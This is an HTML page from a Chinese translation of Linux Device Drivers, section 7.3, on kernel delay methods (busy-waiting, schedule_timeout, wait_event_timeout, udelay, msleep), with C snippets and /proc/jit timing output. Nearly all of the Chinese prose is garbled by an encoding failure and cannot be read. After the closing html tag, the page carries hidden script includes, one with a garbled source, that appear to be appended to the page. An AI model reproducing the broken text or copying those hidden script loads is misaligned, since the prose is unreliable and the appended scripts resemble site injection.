<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>7.3.&#160;Ӻִ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch07.html" title="&#160;7&#160;&#160;ʱ, ʱ, Ӻ">
<link rel="prev" href="ch07s02.html" title="7.2.&#160;֪ǰʱ">
<link rel="next" href="ch07s04.html" title="7.4.&#160;ں˶ʱ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">7.3.&#160;Ӻִ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch07s02.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;7&#160;&#160;ʱ, ʱ, Ӻ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch07s04.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="DelayingExecution.sect"></a>7.3.&#160;Ӻִ</h2></div></div></div>
<p>豸ҪӺһʱִһضƬεĴ, Ӳĳ. һ漰಻ͬļӺ. ÿĻʹּ; ȫϸ, ָÿһĳȱ.</p>
<p>һҪǵҪҪʱʱձȽ, ǵ HZ Ŀƽ̨ķΧ. ֿɿرʱճҲĴȵʱ, ϵͳʱ. ÿʱ͵رʹѭʵ.  2 дһɫش. ڱ, ʹö" long " ʱָһ jiffy ʱ, һЩƽ̨ͬһ,  CPU ں˿Ȼǳ.</p>
<p>ļ۲ͬʱ, ͨһЩ·, Ӹֱϲʺϵķȷķ. ѡ;Ϊںضʱĸ. 㼱ҳȷĴ, ֻҪ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="LongDelays.sect"></a>7.3.1.&#160;ʱ</h3></div></div></div>
<p>ż, һҪӺִԳʱ -- һʱ. мʵʱ; Ǵ򵥵ļʼ, Ž뵽߼Щļ.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Busywaiting.sect"></a>7.3.1.1.&#160;æȴ</h4></div></div></div>
<p>ʱִжʱ, ֵĳЩ, ׵( ܲƼ ) ʵһ jiffy ѭ. æȴʵֳĴ,  j1  jiffies ʱʱֵ:</p>
<pre class="programlisting">
while (time_before(jiffies, j1))
    cpu_relax();
</pre>
<p> cpu_relex  ĵʹһضϵķʽ˵, ʱûô. ϵͳκ; ڶԳƶ߳(" ߳" ) ϵͳ, óĸ߳. , ۺʱп, Ӧȷر. չʾΪżĻ.</p>
<p>һι. ѭ֤ܹΪ jiffies ںͷļʧԵ, , κʱ C Ѱַʱڴлȡ. ܼȷ( ͬƵһ ), æȴصؽϵͳ. 㲻ںΪռ, ѭʱڼȫס˴; ԶռһںеĽ, Ҽȫֱʱ j1 ʱ. һռںʱһ, Ϊ, һ, һЩʱԱ;. , æȴڿռϵͳȻǰ.</p>
<p>, ѭʱжɱֹ, jiffies ᱻ,  while Զ. һռںҲа, 㽫ȥ찴ť.</p>
<p>ʱʵֿõ, ͬе,  jit ģ. ģ鴴Щ /proc/jit* ļÿȡһıʱһ, Щб֤ÿ 20 ֽ. æȴ, Զȡ /proc/jitbusy, ÿһæ-ѭһ.</p>
<p>Ϊȷ, , һ( ߼ ) һδ /proc/jitbusy. 򻯵ע /proc ļں˻Ʒ read ûݻ. , һ,  cat /proc/jitbusy, һζȡ 4KB, ᶳס 205 .</p>
<p>ƼĶ /proc/jitbusy  dd bs=200 &lt; /proc/jitbusy, ѡͬʱָĿ. ļصÿ 20-ֽ бʾ jiffy еֵ, ʱ֮ǰʱ֮. һһ޸ļ:</p>
<pre class="screen">
phon% dd bs=20 count=5 &lt; /proc/jitbusy
 1686518 1687518
 1687519 1688519
 1688520 1689520
 1689520 1690520
 1690521 1691521 
</pre>
<p>ͦ: ʱȷ 1  ( 1000 jiffies ), һ read ϵͳһ̿ʼ. ǿһд CPU-ܼͽ(Ƿռں)ϵͳϻᷢʲô:</p>
<pre class="screen">
phon% dd bs=20 count=5 &lt; /proc/jitbusy
 1911226 1912226
 1913323 1914323
 1919529 1920529
 1925632 1926632
 1931835 1932835 
</pre>
<p>, ÿ read ϵͳþȷʱ 1 , ں˺ķѶ 5 ڵ dd ԱԷһϵͳ֮ǰ. һϵͳ;  CPU ʱеĽ̼乲, һ CPU-ܼ Ķ̬ٵȼ. ( ȲԵڱ鷶Χ֮). </p>
<p>ʾڸµĲѾ load50 ӳн. ʲôĽ, һ CPU-ܼķʽ. ǰ汾ļһ, ȱʡ 50 , ָֿ. ڱ, Լڱ, ʹһиصϵͳĲѾ load50 һеļ.</p>
<p>һռںʱظ, ᷢûһе CPU ԼڸµΪ:</p>
<pre class="screen">
phon% dd bs=20 count=5 &lt; /proc/jitbusy
 14940680 14942777
 14942778 14945430
 14945431 14948491
 14948492 14951960
 14951961 14955840 
</pre>
<p>, ûʱһϵͳõĩβһĿʼ֮, ǵʱԶԶ 1 볤: ֱ 3.8 չʾвʱ. Щֵʾ˽ʱбж, Ľ. ϵͳ֮ļ϶Ψһ̵ĵѡ, ûرʱԿ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Yieldingtheprocessor.sect"></a>7.3.1.2.&#160;ó</h4></div></div></div>
<p>Ѽ, æȴǿһظظϵͳ; ҳһõļ. 뵽ĵһıȷͷ CPU Ƕ䲻Ȥʱ. ͨõȺʵֵ,  &lt;linux/sched.h&gt; :</p>
<pre class="programlisting">
while (time_before(jiffies, j1)) {
    schedule();
}
</pre>
<p>ѭͨȡ /proc/jitsched ͬ /proc/jitbusy һ. , ǲŻ. ǰ̳ͷ CPU κ, ж. ΨһĿн, ʵ( õѡͬһ, ֵõ, ȥ). 仰˵, ĸ( еĽ̵ƽ )  1, ҿ ( ̺ 0, ҲΪԻ, ʷԭ) Ӳ. ܿ޹, ڼǿʱп˴, ¶Լ, ͬʱصʹʱϥϻ. , Ϊʵʱִ, ķѵʱ䶼ͳ.</p>
<p>/proc/jitsched Ϊʵ /proc/jitbusy һռں. һ, һ޸صϵͳ:</p>
<pre class="screen">
phon% dd bs=20 count=5 &lt; /proc/jitsched
 1760205 1761207
 1761209 1762211
 1762212 1763212
 1763213 1764213
 1764214 1765217 
</pre>
<p>ȤҪעÿ read ʱڵȴҪĶ༸ʱ. ϵͳæԽԽ, ܽڵȴʱ. һһʹõͷŴ, ޷֤̽ûشκʱ֮. , ַʽõһȫĽ, Լϵͳǲõ.  load50 ʱ jitsched, Լÿһеʱ˼, Ϊʱʱʱʹ CPU .</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Timeouts.sect"></a>7.3.1.3.&#160;ʱ</h4></div></div></div>
<p>ĿǰΪֹչʾĴŻʱѭͨ鿴 jiffy κ. õʵһʱķ, ܲ, ںΪ.  2 ַһ jiffy ĳʱ, Ƿڵȴ¼.</p>
<p>ʹһȴȴĳЩ¼, Ҳȷһȷʱ, ʹ wait_event_timeout  wait_event_interruptible_timeout:</p>
<pre class="programlisting">
#include &lt;linux/wait.h&gt;
long wait_event_timeout(wait_queue_head_t q, condition, long timeout);
long wait_event_interruptible_timeout(wait_queue_head_t q, condition, long timeout);
</pre>
<p>Щڸ˯, ڳʱ( jiffies ʾ)󷵻. , ʵһ޶˯߲һֱ˯ȥ. עⳬʱֵʾҪȴ jiffies , һʱֵ. ֵһзŵʾ, ΪʱһĽ, ЩṩĳʱֵǸֵͨһ printk 䱧Թ. ʱ, Щ 0; ̱¼,  jiffies ʾʣ೬ʱֵ. ֵӲǸֵ, ʱϵͳضֵ.</p>
<p>/proc/jitqueue ļչʾһ wait_event_interruptible_timeout ʱ, ģû¼ȴ, ʹ 0 Ϊһ:</p>
<pre class="programlisting">
wait_queue_head_t wait; 
init_waitqueue_head (&amp;wait); 
wait_event_interruptible_timeout(wait, 0, delay); 
</pre>
<p>ȡ /proc/jitqueue ʱ, ۲쵽ΪŻ, ڸ:</p>
<pre class="screen">
phon% dd bs=20 count=5 &lt; /proc/jitqueue
 2027024  2028024 
 2028025  2029025 
 2029026  2030026 
 2030027  2031027 
 2031028  2032028  
</pre>
<p>Ϊ̵ȴʱ(  dd )ж, 㿴ַĲ, ۴Ƿһռں.</p>
<p>wait_event_timeout  wait_event_interruptible_timeout ΪӲ, κһִַָ: ˵ wake_up ڵȴ, ߳ʱ. ⲻ jitqueue, Ϊûڵȴϵ wake_up ( Ͼ, û֪ ), ̵ʱʱһֱ. ΪӦر, Ӻִвȴض¼, ںṩ schedule_timeout , Աʹһĵȴͷ:</p>
<pre class="programlisting">
#include &lt;linux/sched.h&gt;
signed long schedule_timeout(signed long timeout);
</pre>
<p>, timeout Ҫʱ jiffies . ֵ 0 ڸ timeout ʧǰ(Ӧһź). schedule_timeout õǰĽ״̬, һ͵ÿ:</p>
<pre class="programlisting">
set_current_state(TASK_INTERRUPTIBLE);
schedule_timeout (delay);
</pre>
<p>ǰ(  /proc/jitschedto ) ½˯ֱʱ. Ϊ wait_event_interruptible_timeout ڲ schedule_timeout, ǲѾʾ jitschedto ص, ΪǺ jitqueue ͬ. һ, ֵһʱڳʱĽʵʱִ֮.</p>
<p>ڸոչʾ, һе set_current_state 趨һЩԱٴеǰ, ֱʱû TASK_RUNNING ״̬. Ϊһжϵʱ, ʹ TASK_UNINTERRUPTIBLE . Ǹı䵱ǰ̵״̬,  schedule_time ͬ shcedule( , jitsched Ϊ), һõĶʱ.</p>
<p>ʹ 4  jit ļڲͬϵͳ»߲ͬں, ߳ķʽӺִ, ʱģʱͨ趨ʱģ.</p>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ShortDelays.sect"></a>7.3.2.&#160;ʱ</h3></div></div></div>
<p>һ豸ҪӲķӦʱ, 漰ʱ༸. , ʱȻ·.</p>
The kernel functions ndelay, udelay, and mdelay serve well for short delays, delaying execution for the specified number of nanoseconds, microseconds, or milliseconds respectively.* Their prototypes are: 
 * The u in udelay represents the Greek letter mu and stands for micro. 
<p>ں˺ ndelay, udelay, Լ mdelay ڶʱ, ֱӺִָ, ΢ߺ. <sup>[<a name="id444639" href="#ftn.id444639">27</a>]</sup>ǵԭ:</p>
<pre class="programlisting">
#include &lt;linux/delay.h&gt;
void ndelay(unsigned long nsecs);
void udelay(unsigned long usecs);
void mdelay(unsigned long msecs);
</pre>
<p>Щʵʵ &lt;asm/delay.h&gt;, ϵض, ʱһⲿ. ÿϵʵ udelay, ĺܻ߲ܶ; ûж, &lt;linux/delay.h&gt; ṩһȱʡĻ udelay İ汾. е, õʱҪֵ, ܸ; ʵ, ǰûƽ̨ľ, мṩ˴΢ľ. ʱҪֵͨ, ΪеĶʱҪȴӲ, Ҫǵȴһʱʧ.</p>
<p>udelay ʵ(  ndelay Ҳ) ʹһѭʱĴٶ, ʹ loos_per_jiffy. 뿴ʵʵĴ, , С x86 ʵ൱ӵһΪʹõĲͬʱԴ, ʲô CPU д.</p>
<p>Ϊѭ, udelay  ndelay ǿһ޸ݸǵֵ. ģ޷غʾһδķ, __bad_udelay, ζʹ̫Ĳ udleay. ע, , ʱֻԳвҲеƽ̨ʵ. ΪһͨõĹ, ͼʱǧ, Ӧʹ udelay  ndelay; Ƶ, ģʱӦʹ mdelay ɶһϸȵĺ. </p>
<p>ҪǼס 3 ʱæȴ; ʱʧʱ. , ظ, һͬĹģ, jitbusy . , ЩӦֻûʵõʱ.</p>
<p>һú(͸)ʱ漰æȴ. ļ &lt;linux/delay.h&gt; Щ:</p>
<pre class="programlisting">
void msleep(unsigned int millisecs);
unsigned long msleep_interruptible(unsigned int millisecs);
void ssleep(unsigned int seconds)
</pre>
<p>ǰ 2 ʹý̽˯߸ĺ. һ msleep ĵǲжϵ; ȷ˯ٸĺ. λһȴв뻽˯, ʹ msleep_interruptible.  msleep_interruptible ķֵ 0; , , ̱绽, ֵڳʼ˯ʣĺ.  ssleep ĵʹ̽һжϵ˯߸.</p>
<p>ͨ, ܹ̱ĸʱ, Ӧʹ schedule_timeout, msleep,  ssleep.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id444639" href="#id444639">27</a>] </sup>udelay е u ʾϣĸ mu Ҵ micro.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch07s02.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch07.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch07s04.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">7.2.&#160;֪ǰʱ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;7.4.&#160;ں˶ʱ</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>